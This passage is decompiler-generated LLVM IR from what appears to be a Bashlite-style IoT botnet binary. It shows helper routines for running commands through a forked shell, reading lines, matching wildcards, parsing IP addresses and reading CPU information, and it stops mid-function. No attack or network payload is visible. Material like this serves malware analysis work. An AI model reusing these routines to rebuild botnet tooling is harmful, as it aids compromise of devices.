  %v1_8048966 = inttoptr i32 %v1_804895e to i8*
  store i8* %v1_8048966, i8** @global_var_80655a0.13, align 32
  %v2_8048970 = icmp eq i32 %v1_804895e, 0
  %v1_8048972 = icmp eq i1 %v2_8048970, false
  br i1 %v1_8048972, label %dec_label_pc_8048980, label %dec_label_pc_8048ad1

dec_label_pc_8048980:                             ; preds = %dec_label_pc_8048954
  %v1_8048983 = mul i32 %v0_804893a, 4
  store i32 %v1_804895e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048994 = and i32 %v1_804895e, -256
  %v5_8048996 = call i8* @_memset(i8* %v1_8048966, i32 %v1_8048994, i32 %v1_8048983)
  br label %bb

bb:                                               ; preds = %dec_label_pc_8048931, %dec_label_pc_8048980
  %v1_8048998 = call i32 @__vfork(i32 %tmp23)
  %v13_80489a6 = icmp eq i32 %v1_8048998, -1
  br i1 %v13_80489a6, label %dec_label_pc_80489b7, label %dec_label_pc_80489ac

dec_label_pc_80489ac:                             ; preds = %bb
  %v4_80489ac = icmp eq i32 %v1_8048998, 0
  %v2_80489e4 = load i8, i8* %tmp24, align 1
  %v10_80489e6 = icmp eq i8 %v2_80489e4, 114
  %v1_80489e8 = icmp eq i1 %v10_80489e6, false
  br i1 %v4_80489ac, label %dec_label_pc_80489e1, label %dec_label_pc_8048a82

dec_label_pc_80489b7:                             ; preds = %bb
  %v3_80489b7 = load i32, i32* %stack_var_-24, align 4
  %v1_80489be = call i32 @__libc_close(i32 %v3_80489b7)
  %v1_80489cd = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ad1

dec_label_pc_80489e1:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048a23, label %dec_label_pc_80489ea

dec_label_pc_80489ea:                             ; preds = %dec_label_pc_80489e1
  %v9_80489ed = icmp eq i32 %tmp19, 1
  br i1 %v9_80489ed, label %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, label %dec_label_pc_80489f2

dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge: ; preds = %dec_label_pc_80489ea
  br label %dec_label_pc_8048a12

dec_label_pc_80489f2:                             ; preds = %dec_label_pc_80489ea
  %v2_80489fb = call i32 @dup2(i32 %tmp19, i32 1)
  %v1_8048a0a = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a12

dec_label_pc_8048a12:                             ; preds = %dec_label_pc_80489ea.dec_label_pc_8048a12_crit_edge, %dec_label_pc_80489f2
  %v3_8048a12 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a19 = call i32 @__libc_close(i32 %v3_8048a12)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a23:                             ; preds = %dec_label_pc_80489e1
  %v3_8048a23 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a26 = icmp eq i32 %v3_8048a23, 0
  br i1 %v1_8048a26, label %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, label %dec_label_pc_8048a2a

dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge: ; preds = %dec_label_pc_8048a23
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a2a:                             ; preds = %dec_label_pc_8048a23
  %v2_8048a33 = call i32 @dup2(i32 %v3_8048a23, i32 0)
  %v3_8048a3b = load i32, i32* %stack_var_-24, align 4
  %v1_8048a42 = call i32 @__libc_close(i32 %v3_8048a3b)
  br label %dec_label_pc_8048a4a

dec_label_pc_8048a4a:                             ; preds = %dec_label_pc_8048a23.dec_label_pc_8048a4a_crit_edge, %dec_label_pc_8048a2a
  %v1_8048a51 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048a59

dec_label_pc_8048a59:                             ; preds = %dec_label_pc_8048a12, %dec_label_pc_8048a4a
  %v8_8048a70 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_8056d2a.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_80569fb.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_8056d27.14 to i32), i32 %tmp18, i32 0)
  %v1_8048a7d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_80489ac
  br i1 %v1_80489e8, label %dec_label_pc_8048aa2, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v3_8048a8b = load i32, i32* %stack_var_-24, align 4
  %v2_8048a98 = call i32 @__libc_close(i32 %tmp19)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048aa2:                             ; preds = %dec_label_pc_8048a82
  %v3_8048aa8 = load i32, i32* %stack_var_-24, align 4
  %v2_8048aaf = call i32 @__libc_close(i32 %v3_8048aa8)
  br label %dec_label_pc_8048ab7

dec_label_pc_8048ab7:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048aa2
  %stack_var_-28.0 = phi i32 [ %v3_8048a8b, %dec_label_pc_8048a8b ], [ %tmp19, %dec_label_pc_8048aa2 ]
  %v2_8048aba = mul i32 %stack_var_-28.0, 4
  %v0_8048abf = load i8*, i8** @global_var_80655a0.13, align 4
  %v1_8048abf = ptrtoint i8* %v0_8048abf to i32
  %v2_8048ac4 = add i32 %v1_8048abf, %v2_8048aba
  %v2_8048ac9 = inttoptr i32 %v2_8048ac4 to i32*
  store i32 %v1_8048998, i32* %v2_8048ac9, align 4
  br label %dec_label_pc_8048ad1

dec_label_pc_8048ad1:                             ; preds = %dec_label_pc_8048954, %dec_label_pc_804893a, %dec_label_pc_8048912, %dec_label_pc_80488f3, %dec_label_pc_80488fc, %dec_label_pc_80489b7, %dec_label_pc_8048ab7
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_80489b7 ], [ %stack_var_-28.0, %dec_label_pc_8048ab7 ], [ -1, %dec_label_pc_80488fc ], [ -1, %dec_label_pc_80488f3 ], [ -1, %dec_label_pc_8048912 ], [ -1, %dec_label_pc_804893a ], [ -1, %dec_label_pc_8048954 ]
  %v3_8048ad4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048ad4, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v1_8048998, { 1, 2, 0 }
  uselistorder i32 %v1_804895e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804893a, { 2, 0, 1 }
  uselistorder i8* %tmp24, { 0, 1, 3, 2 }
  uselistorder i32 %tmp19, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder label %dec_label_pc_8048ad1, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048ab7, { 1, 0 }
  uselistorder label %dec_label_pc_8048a59, { 1, 0 }
  uselistorder label %dec_label_pc_8048a4a, { 1, 0 }
  uselistorder label %dec_label_pc_8048a12, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose() local_unnamed_addr {
entry:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048ad9 = load i32, i32* @ebp, align 4
  store i32 %v0_8048ad9, i32* %stack_var_-4, align 4
  %v0_8048ae2 = load i8*, i8** @global_var_80655a0.13, align 4
  %v2_8048ae7 = icmp eq i8* %v0_8048ae2, null
  br i1 %v2_8048ae7, label %dec_label_pc_8048c35, label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %entry
  %v1_8048ae2 = ptrtoint i8* %v0_8048ae2 to i32
  %v2_8048aee = mul i32 %tmp11, 4
  %v2_8048af8 = add i32 %v1_8048ae2, %v2_8048aee
  %v1_8048afb = inttoptr i32 %v2_8048af8 to i32*
  %v2_8048afb = load i32, i32* %v1_8048afb, align 4
  %v1_8048afd = icmp eq i32 %v2_8048afb, 0
  %v1_8048aff = icmp eq i1 %v1_8048afd, false
  br i1 %v1_8048aff, label %dec_label_pc_8048b10, label %dec_label_pc_8048c35

dec_label_pc_8048b10:                             ; preds = %dec_label_pc_8048aeb
  %v1_8048b16 = call i32 @__libc_close(i32 %tmp11)
  %v2_8048b21 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048b28 = call i32 @sigemptyset(i32 %v2_8048b21)
  %v2_8048b3c = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 2)
  %v2_8048b50 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 3)
  %v2_8048b64 = call i32 @__GI_sigaddset(i32 %v2_8048b21, i32 1)
  %v2_8048b6f = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048b7f = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048b7f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048b7f, i32 %v2_8048b6f)
  %v2_8048b9e = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048b87

dec_label_pc_8048b87:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b10
  %v0_8048b8f = load i8*, i8** @global_var_80655a0.13, align 4
  %v1_8048b8f = ptrtoint i8* %v0_8048b8f to i32
  %v2_8048b94 = add i32 %v1_8048b8f, %v2_8048aee
  %v1_8048b97 = inttoptr i32 %v2_8048b94 to i32*
  %v2_8048b97 = load i32, i32* %v1_8048b97, align 4
  %v3_8048ba6 = call i32 @__libc_waitpid(i32 %v2_8048b97, i32 %v2_8048b9e, i32 0)
  %v13_8048bb4 = icmp eq i32 %v3_8048ba6, -1
  %v1_8048bbb = icmp eq i1 %v13_8048bb4, false
  br i1 %v1_8048bbb, label %dec_label_pc_8048bc9, label %dec_label_pc_8048bbd

dec_label_pc_8048bbd:                             ; preds = %dec_label_pc_8048b87
  %v1_8048bbd = call i32 @__errno_location(i32 %v3_8048ba6)
  %v1_8048bc2 = inttoptr i32 %v1_8048bbd to i32*
  %v2_8048bc2 = load i32, i32* %v1_8048bc2, align 4
  %v9_8048bc4 = icmp eq i32 %v2_8048bc2, 4
  br i1 %v9_8048bc4, label %dec_label_pc_8048b87, label %dec_label_pc_8048bc9

dec_label_pc_8048bc9:                             ; preds = %dec_label_pc_8048bbd, %dec_label_pc_8048b87
  %v13_8048bb4.lcssa = phi i1 [ true, %dec_label_pc_8048bbd ], [ false, %dec_label_pc_8048b87 ]
  %v3_8048bd7 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048bd7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048bd7, i32 0)
  %v2_8048be5 = mul i32 %tmp8, 4
  %v0_8048bea = load i8*, i8** @global_var_80655a0.13, align 4
  %v1_8048bea = ptrtoint i8* %v0_8048bea to i32
  %v2_8048bef = add i32 %v1_8048bea, %v2_8048be5
  %v1_8048bf2 = inttoptr i32 %v2_8048bef to i32*
  store i32 0, i32* %v1_8048bf2, align 4
  br i1 %v13_8048bb4.lcssa, label %dec_label_pc_8048c29, label %dec_label_pc_8048c01

dec_label_pc_8048c01:                             ; preds = %dec_label_pc_8048bc9
  %v3_8048c01 = load i32, i32* %stack_var_-268, align 4
  %v1_8048c0d = and i32 %v3_8048c01, 65280
  %v2_8048c141 = udiv i32 %v1_8048c0d, 256
  br label %dec_label_pc_8048c29

dec_label_pc_8048c29:                             ; preds = %dec_label_pc_8048bc9, %dec_label_pc_8048c01
  %storemerge2 = phi i32 [ %v2_8048c141, %dec_label_pc_8048c01 ], [ -1, %dec_label_pc_8048bc9 ]
  %v2_8048c3b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048c35

dec_label_pc_8048c35:                             ; preds = %entry, %dec_label_pc_8048aeb, %dec_label_pc_8048c29
  %v2_8048c3b = phi i32 [ %v2_8048c3b.pre, %dec_label_pc_8048c29 ], [ %v0_8048ad9, %dec_label_pc_8048aeb ], [ %v0_8048ad9, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048c29 ], [ -1, %dec_label_pc_8048aeb ], [ -1, %entry ]
  store i32 %v2_8048c3b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048ba6, { 1, 0 }
  uselistorder i32 %v2_8048aee, { 1, 0 }
  uselistorder i8* %v0_8048ae2, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_80655a0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048c29, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048c76

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c7e
  %v3_8048c62 = inttoptr i32 %v5_8048c81 to i32*
  %v4_8048c62 = call i32 @__libc_read(i32 %arg3, i32* %v3_8048c62, i32 1)
  %v4_8048c6d = add nuw i32 %storemerge115, 1
  %v8_8048c70 = icmp eq i32 %v4_8048c62, 0
  %v12_8048c70 = icmp eq i32 %v4_8048c62, 1
  %v1_8048c74 = icmp eq i1 %v12_8048c70, false
  br i1 %v1_8048c74, label %dec_label_pc_8048c8b, label %dec_label_pc_8048c76

dec_label_pc_8048c76:                             ; preds = %entry, %dec_label_pc_8048c53
  %v8_8048c7016 = phi i1 [ false, %entry ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  %storemerge115 = phi i32 [ 0, %entry ], [ %v4_8048c6d, %dec_label_pc_8048c53 ]
  %v5_8048c7c = icmp slt i32 %storemerge115, %arg2
  br i1 %v5_8048c7c, label %dec_label_pc_8048c7e, label %dec_label_pc_8048c8b

dec_label_pc_8048c7e:                             ; preds = %dec_label_pc_8048c76
  %v5_8048c81 = add i32 %storemerge115, %arg1
  %v1_8048c84 = add i32 %v5_8048c81, -1
  %v1_8048c85 = inttoptr i32 %v1_8048c84 to i8*
  %v2_8048c85 = load i8, i8* %v1_8048c85, align 1
  %v10_8048c87 = icmp eq i8 %v2_8048c85, 10
  %v1_8048c89 = icmp eq i1 %v10_8048c87, false
  br i1 %v1_8048c89, label %dec_label_pc_8048c53, label %dec_label_pc_8048c8b

dec_label_pc_8048c8b:                             ; preds = %dec_label_pc_8048c76, %dec_label_pc_8048c7e, %dec_label_pc_8048c53
  %v8_8048c70.lcssa = phi i1 [ %v8_8048c7016, %dec_label_pc_8048c76 ], [ %v8_8048c7016, %dec_label_pc_8048c7e ], [ %v8_8048c70, %dec_label_pc_8048c53 ]
  br i1 %v8_8048c70.lcssa, label %dec_label_pc_8048ca0, label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c8b
  br label %dec_label_pc_8048ca0

dec_label_pc_8048ca0:                             ; preds = %dec_label_pc_8048c8b, %dec_label_pc_8048c91
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048c91 ], [ 0, %dec_label_pc_8048c8b ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048c81, { 1, 0 }
  uselistorder i32 %storemerge115, { 2, 0, 1 }
  uselistorder i1 %v8_8048c7016, { 1, 0 }
  uselistorder i1 %v8_8048c70, { 1, 0 }
  uselistorder i32 %v4_8048c62, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048ca0, { 1, 0 }
  uselistorder label %dec_label_pc_8048c8b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048c76, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048cd55 = ptrtoint i8* %arg1 to i32
  %v2_8048cd86 = load i8, i8* %arg1, align 1
  %v4_8048cda10 = icmp eq i8 %v2_8048cd86, 0
  br i1 %v4_8048cda10, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cb4:                             ; preds = %dec_label_pc_8048cde
  %v2_8048cb9 = mul i32 %stack_var_-8.011, 16
  %v2_8048cbf = load i8, i8* %stack_var_4.012, align 1
  %v3_8048cbf = zext i8 %v2_8048cbf to i32
  %v1_8048cc6 = mul nuw nsw i32 %v3_8048cbf, 4
  %v2_8048cc6 = add i32 %v1_8048cc6, ptrtoint (i32* @global_var_8056d40.17 to i32)
  %v3_8048cc6 = inttoptr i32 %v2_8048cc6 to i32*
  %v4_8048cc6 = load i32, i32* %v3_8048cc6, align 4
  %v2_8048ccd = or i32 %v4_8048cc6, %v2_8048cb9
  %v5_8048cd2 = add i32 %v4_8048cd513, 1
  %v22_8048cd2 = inttoptr i32 %v5_8048cd2 to i8*
  %v2_8048cd8 = load i8, i8* %v22_8048cd2, align 1
  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd513 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd55, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.011, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp13 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp13, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp13, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge7 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp13, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp13, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.8 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.8, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_8048d71 ], [ %storemerge4, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp13, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e5a = load i32, i32* @ebp, align 4
  store i32 %v0_8048e5a, i32* %stack_var_-4, align 4
  %v4_8048e826 = ptrtoint i8* %arg1 to i32
  %v2_8048e857 = load i8, i8* %arg1, align 1
  %v3_8048e858 = zext i8 %v2_8048e857 to i32
  %v5_8048e859 = and i32 %v4_8048e826, -256
  %v6_8048e8510 = or i32 %v3_8048e858, %v5_8048e859
  %v4_8048e8711 = icmp eq i8 %v2_8048e857, 0
  %v1_8048e8912 = icmp eq i1 %v4_8048e8711, false
  br i1 %v1_8048e8912, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8214 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e826, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.013, align 1
  %v5_8048e7f = add i32 %v4_8048e8214, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  %v2_8048e8b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v2_8048e8b = phi i32 [ %v2_8048e8b.pre, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v0_8048e5a, %entry ]
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8510, %entry ]
  store i32 %v2_8048e8b, i32* @ebp, align 4
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048ea1 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8057140.18, i32 0, i32 0), i32 0)
  %v2_8048fff = ptrtoint i32* %stack_var_-4112 to i32
  %tmp34 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804901137 = call i32 @fdgets(i32 %v2_8048fff, i32 4096, i32 %v5_8048ea1)
  %v1_804901938 = icmp eq i32 %v5_804901137, 0
  %v1_804901b39 = icmp eq i1 %v1_804901938, false
  br i1 %v1_804901b39, label %dec_label_pc_8048eb1.lr.ph, label %dec_label_pc_8049021

dec_label_pc_8048eb1.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8048eb1

dec_label_pc_8048eb1:                             ; preds = %dec_label_pc_8048eb1.lr.ph, %dec_label_pc_8048fe3
  %v3_8048ebb = call i32 @uppercase(i8* %tmp34)
  %v5_8048ed2 = call i32 @strstr(i32 %v2_8048fff, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805714e.19, i32 0, i32 0))
  %v12_8048ee2 = icmp eq i32 %v5_8048ed2, %v2_8048fff
  %v1_8048ee4 = icmp eq i1 %v12_8048ee2, false
  br i1 %v1_8048ee4, label %dec_label_pc_8048fe3, label %dec_label_pc_8048eea

dec_label_pc_8048eea:                             ; preds = %dec_label_pc_8048eb1
  %tmp35 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048efb

dec_label_pc_8048ef8:                             ; preds = %dec_label_pc_8048f0d, %dec_label_pc_8048f04, %dec_label_pc_8048efb
